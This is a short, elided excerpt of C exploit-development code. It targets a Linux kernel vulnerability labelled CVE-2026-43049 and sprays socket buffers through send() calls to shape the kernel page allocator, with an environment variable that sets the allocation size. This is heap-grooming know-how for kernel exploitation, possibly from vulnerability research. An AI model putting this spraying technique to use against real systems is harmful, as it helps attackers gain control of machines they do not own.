...
/* CVE-2026-43049 wants the *page-allocator* side of this vehicle, not
 * kmalloc-8k: a payload whose alloc exceeds KMALLOC_MAX_CACHE_SIZE goes through
 * kmalloc_large to a whole order-N block.  PAGETRACE_SKB_LEN overrides the
 * length so the order can be measured per size without disturbing the 7808-byte
 * figure the badepoll work is written against. */
static long skb_len(void)
{
	const char *e = getenv("PAGETRACE_SKB_LEN");
	long v = e ? atol(e) : 0;
	return (v >= 64 && v <= 60000) ? v : SKB_LEN;
}
...
static long alloc_skb(long n)
{
	...
	while (made < n) {
		...
		for (int k = 0; k < 16 && made < n; k++) {
			if (send(sv[0], buf, len, MSG_DONTWAIT) <= 0)
				break;
			made++;
		}
	}
